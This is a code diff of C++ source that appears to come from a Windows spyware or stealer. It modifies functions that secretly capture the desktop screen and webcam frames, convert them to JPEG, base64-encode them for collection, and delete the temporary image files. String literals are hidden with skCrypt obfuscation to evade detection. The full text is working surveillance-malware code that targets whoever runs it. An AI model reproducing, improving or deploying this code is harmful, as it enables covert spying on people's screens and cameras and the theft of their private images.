@@ -352,6 +352,9 @@ string getClipboard() {
 }
 
 string getScreenshot() {
+    string filename = TEMPFILE + (string)skCrypt(".bmp");
+    string filename2 = TEMPFILE + (string)skCrypt(".jpg");
+
     HWND desktopHwnd = GetDesktopWindow();
     RECT desktopParams;
     HDC devC = GetDC(desktopHwnd);
@@ -385,18 +388,24 @@ string getScreenshot() {
     BitBlt(captureDC, 0, 0, width, height, devC, 0, 0, SRCCOPY | CAPTUREBLT);
     GetDIBits(captureDC, captureBitmap, 0, height, image, (LPBITMAPINFO)infoHeader, DIB_RGB_COLORS);
 
-    HANDLE hFile = CreateFileA((TEMPFILE).c_str(), GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, 0, 0);
+    HANDLE hFile = CreateFileA(filename.c_str(), GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, 0, 0);
     WriteFile(hFile, bmpData, fileSize, new DWORD, 0);
     CloseHandle(hFile);
     GlobalFree(bmpData);
 
-    ifstream imageFile(TEMPFILE, ios::in | ios::binary);
+    CImage Cimage;
+    HRESULT res = Cimage.Load((const wchar_t*)wstring(filename.begin(), filename.end()).c_str());
+    Cimage.Save((const wchar_t*)wstring(filename2.begin(), filename2.end()).c_str());
+
+    ifstream imageFile(filename2, ios::in | ios::binary);
     vector<BYTE> data(istreambuf_iterator<char>(imageFile), {});
     string result = base64_encode(&data[0], data.size());
     imageFile.close();
     
-    if (remove((TEMPFILE).c_str()) != 0)
-        DeleteFileA((TEMPFILE).c_str());
+    if (remove(filename.c_str()) != 0)
+        DeleteFileA(filename.c_str());
+    if (remove(filename2.c_str()) != 0)
+        DeleteFileA(filename2.c_str());
 
     return result;
 }
@@ -638,142 +647,143 @@ void takeWebcams() {
     n = 0;
     while (true) {
         hr = pEnum->Next(1, &pMoniker, NULL);
-        if (hr == S_OK) {
-            n++;
 
-            hr = pMoniker->BindToStorage(0, 0, IID_PPV_ARGS(&pPropBag));
-            VariantInit(&var);
-            hr = pPropBag->Read(CA2W(skCrypt("FriendlyName")), &var, 0);
-            _bstr_t tmp(var.bstrVal);
-            wstring FullFIleName((wchar_t*)tmp, tmp.length());
-            string filename = WEBCAM_PATH + string(FullFIleName.begin(), FullFIleName.end()) + (string)skCrypt(".bmp");
-            VariantClear(&var);
+        if (hr != S_OK)
+            goto cleanup;
 
-            hr = pMoniker->BindToObject(0, 0, IID_IBaseFilter, (void**)&pCap);
-            if (hr != S_OK) 
+        n++;
+
+        hr = pMoniker->BindToStorage(0, 0, IID_PPV_ARGS(&pPropBag));
+        VariantInit(&var);
+        hr = pPropBag->Read(CA2W(skCrypt("FriendlyName")), &var, 0);
+        _bstr_t tmp(var.bstrVal);
+        wstring FullFIleName((wchar_t*)tmp, tmp.length());
+        string filename = WEBCAM_PATH + string(FullFIleName.begin(), FullFIleName.end()) + (string)skCrypt(".bmp");
+        VariantClear(&var);
+
+        hr = pMoniker->BindToObject(0, 0, IID_IBaseFilter, (void**)&pCap);
+        if (hr != S_OK) 
+            goto cleanup;
+
+        hr = pGraph->AddFilter(pCap, CA2W(skCrypt("Capture Filter")));
+        if (hr != S_OK) 
+            goto cleanup;
+
+        hr = CoCreateInstance(CLSID_SampleGrabber, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&pSampleGrabberFilter);
+        if (hr != S_OK)
+            goto cleanup;
+
+        hr = pSampleGrabberFilter->QueryInterface(DexterLib::IID_ISampleGrabber, (void**)&pSampleGrabber);
+        if (hr != S_OK)
+            goto cleanup;
+
+        hr = pSampleGrabber->SetBufferSamples(TRUE);
+        if (hr != S_OK)
+            goto cleanup;
+
+        AM_MEDIA_TYPE mt;
+        ZeroMemory(&mt, sizeof(AM_MEDIA_TYPE));
+        mt.majortype = MEDIATYPE_Video;
+        mt.subtype = MEDIASUBTYPE_RGB24;
+        hr = pSampleGrabber->SetMediaType((DexterLib::_AMMediaType*)&mt);
+        if (hr != S_OK)
+            goto cleanup;
+
+        hr = pGraph->AddFilter(pSampleGrabberFilter, CA2W(skCrypt("SampleGrab")));
+        if (hr != S_OK)
+            goto cleanup;
+
+        hr = CoCreateInstance(CLSID_NullRenderer, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&pNullRenderer);
+        if (hr != S_OK)
+            goto cleanup;
+
+        hr = pGraph->AddFilter(pNullRenderer, CA2W(skCrypt("NullRender")));
+        if (hr != S_OK)
+            goto cleanup;
+
+        hr = pBuilder->RenderStream(&PIN_CATEGORY_CAPTURE, &MEDIATYPE_Video, pCap, pSampleGrabberFilter, pNullRenderer);
+        if (hr != S_OK)
+            goto cleanup;
+
+        hr = pGraph->QueryInterface(IID_IMediaControl, (void**)&pMediaControl);
+        if (hr != S_OK) 
+            goto cleanup;
+
+        while (true) {
+            hr = pMediaControl->Run();
+
+            if (hr == S_OK) 
+                break;
+            if (hr == S_FALSE) 
+                continue; 
+
+            goto cleanup;
+        }
+
+
+        while (true) {
+            hr = pSampleGrabber->GetCurrentBuffer(&buffer_size, NULL);
+            if (hr == S_OK && buffer_size != 0) 
+                break;
+            if (hr != S_OK && hr != VFW_E_WRONG_STATE)
+                goto cleanup;
+        }
+
+        pMediaControl->Stop();
+
+        pBuffer = new char[buffer_size];
+        if (!pBuffer)
+            goto cleanup;
+
+        hr = pSampleGrabber->GetCurrentBuffer(&buffer_size, (long*)pBuffer);
+        if (hr != S_OK)
+            goto cleanup;
+
+        hr = pSampleGrabber->GetConnectedMediaType((DexterLib::_AMMediaType*)&mt);
+        if (hr != S_OK) 
+            goto cleanup;
+
+        if (mt.formattype == FORMAT_VideoInfo && mt.cbFormat >= sizeof(VIDEOINFOHEADER) && mt.pbFormat != NULL) {
+            pVih = (VIDEOINFOHEADER*)mt.pbFormat;
+
+            long cbBitmapInfoSize = mt.cbFormat - SIZE_PREHEADER;
+            BITMAPFILEHEADER bfh;
+            ZeroMemory(&bfh, sizeof(bfh));
+            bfh.bfType = 'MB'; // "BM" in little-endian
+            bfh.bfSize = sizeof(bfh) + buffer_size + cbBitmapInfoSize;
+            bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + cbBitmapInfoSize;
+
+            wchar_t wtext[100];
+            mbstowcs(wtext, filename.c_str(), filename.length() + 1);
+            HANDLE hf = CreateFile(wtext, GENERIC_WRITE,
+                FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, NULL);
+            if (hf == INVALID_HANDLE_VALUE)
                 goto cleanup;
 
-            hr = pGraph->AddFilter(pCap, CA2W(skCrypt("Capture Filter")));
-            if (hr != S_OK) 
-                goto cleanup;
+            DWORD dwWritten = 0;
+            WriteFile(hf, &bfh, sizeof(bfh), &dwWritten, NULL);
+            WriteFile(hf, HEADER(pVih),
+                cbBitmapInfoSize, &dwWritten, NULL);
 
-            hr = CoCreateInstance(CLSID_SampleGrabber, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&pSampleGrabberFilter);
-            if (hr != S_OK)
-                goto cleanup;
-
-            hr = pSampleGrabberFilter->QueryInterface(DexterLib::IID_ISampleGrabber, (void**)&pSampleGrabber);
-            if (hr != S_OK)
-                goto cleanup;
-
-            hr = pSampleGrabber->SetBufferSamples(TRUE);
-            if (hr != S_OK)
-                goto cleanup;
-
-            AM_MEDIA_TYPE mt;
-            ZeroMemory(&mt, sizeof(AM_MEDIA_TYPE));
-            mt.majortype = MEDIATYPE_Video;
-            mt.subtype = MEDIASUBTYPE_RGB24;
-            hr = pSampleGrabber->SetMediaType((DexterLib::_AMMediaType*)&mt);
-            if (hr != S_OK)
-                goto cleanup;
-
-            hr = pGraph->AddFilter(pSampleGrabberFilter, CA2W(skCrypt("SampleGrab")));
-            if (hr != S_OK)
-                goto cleanup;
-
-            hr = CoCreateInstance(CLSID_NullRenderer, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&pNullRenderer);
-            if (hr != S_OK)
-                goto cleanup;
-
-            hr = pGraph->AddFilter(pNullRenderer, CA2W(skCrypt("NullRender")));
-            if (hr != S_OK)
-                goto cleanup;
-
-            hr = pBuilder->RenderStream(&PIN_CATEGORY_CAPTURE, &MEDIATYPE_Video, pCap, pSampleGrabberFilter, pNullRenderer);
-            if (hr != S_OK)
-                goto cleanup;
-
-            hr = pGraph->QueryInterface(IID_IMediaControl, (void**)&pMediaControl);
-            if (hr != S_OK) 
-                goto cleanup;
-
-            while (true) {
-                hr = pMediaControl->Run();
-
-                if (hr == S_OK) 
-                    break;
-                if (hr == S_FALSE) 
-                    continue; 
-
-                goto cleanup;
-            }
-
-
-            while (true) {
-                hr = pSampleGrabber->GetCurrentBuffer(&buffer_size, NULL);
-                if (hr == S_OK && buffer_size != 0) 
-                    break;
-                if (hr != S_OK && hr != VFW_E_WRONG_STATE)
-                    goto cleanup;
-            }
-
-            pMediaControl->Stop();
-
-            pBuffer = new char[buffer_size];
-            if (!pBuffer)
-                goto cleanup;
-
-            hr = pSampleGrabber->GetCurrentBuffer(&buffer_size, (long*)pBuffer);
-            if (hr != S_OK)
-                goto cleanup;
-
-            hr = pSampleGrabber->GetConnectedMediaType((DexterLib::_AMMediaType*)&mt);
-            if (hr != S_OK) 
-                goto cleanup;
-
-            if (mt.formattype == FORMAT_VideoInfo && mt.cbFormat >= sizeof(VIDEOINFOHEADER) && mt.pbFormat != NULL) {
-                pVih = (VIDEOINFOHEADER*)mt.pbFormat;
-
-                long cbBitmapInfoSize = mt.cbFormat - SIZE_PREHEADER;
-                BITMAPFILEHEADER bfh;
-                ZeroMemory(&bfh, sizeof(bfh));
-                bfh.bfType = 'MB'; // "BM" in little-endian
-                bfh.bfSize = sizeof(bfh) + buffer_size + cbBitmapInfoSize;
-                bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + cbBitmapInfoSize;
-
-                wchar_t wtext[100];
-                mbstowcs(wtext, filename.c_str(), filename.length() + 1);
-                HANDLE hf = CreateFile(wtext, GENERIC_WRITE,
-                    FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, NULL);
-                if (hf == INVALID_HANDLE_VALUE)
-                    goto cleanup;
-
-                DWORD dwWritten = 0;
-                WriteFile(hf, &bfh, sizeof(bfh), &dwWritten, NULL);
-                WriteFile(hf, HEADER(pVih),
-                    cbBitmapInfoSize, &dwWritten, NULL);
-
-                WriteFile(hf, pBuffer, buffer_size, &dwWritten, NULL);
-                CloseHandle(hf);
-            }
-            else
-                goto cleanup;
-
-
-            if (mt.cbFormat != 0) {
-                CoTaskMemFree((PVOID)mt.pbFormat);
-                mt.cbFormat = 0;
-                mt.pbFormat = NULL;
-            }
-            if (mt.pUnk != NULL) {
-                mt.pUnk->Release();
-                mt.pUnk = NULL;
-            }
-
-            filenames.push_back(filename);
+            WriteFile(hf, pBuffer, buffer_size, &dwWritten, NULL);
+            CloseHandle(hf);
         }
         else
             goto cleanup;
+
+
+        if (mt.cbFormat != 0) {
+            CoTaskMemFree((PVOID)mt.pbFormat);
+            mt.cbFormat = 0;
+            mt.pbFormat = NULL;
+        }
+        if (mt.pUnk != NULL) {
+            mt.pUnk->Release();
+            mt.pUnk = NULL;
+        }
+
+        filenames.push_back(filename);
+
         if (n >= MAX_PHOTOS)
             break;
     }
@@ -809,12 +819,20 @@ cleanup:
 
 
     for (string file : filenames) {
-        ifstream webcamFile(file, ios::in | ios::binary);
+        string file2 = split(split(file, '\\').back(), '.')[0] + (string)skCrypt(".jpg");
+        CImage Cimage;
+        HRESULT res = Cimage.Load((const wchar_t*)wstring(file.begin(), file.end()).c_str());
+        Cimage.Save((const wchar_t*)wstring(file2.begin(), file2.end()).c_str());
+
+        ifstream webcamFile(file2, ios::in | ios::binary);
         vector<BYTE> data(istreambuf_iterator<char>(webcamFile), {});
-        webcams.push_back(split(file, '\\').back() + (string)skCrypt(" ") + base64_encode(&data[0], data.size()));
+        webcams.push_back(split(file2, '\\').back() + (string)skCrypt(" ") + base64_encode(&data[0], data.size()));
         webcamFile.close();
+
         if (remove(file.c_str()) != 0)
             DeleteFileA(file.c_str());
+        if (remove(file2.c_str()) != 0)
+            DeleteFileA(file2.c_str());
     }
 
     if (deleteFolder)
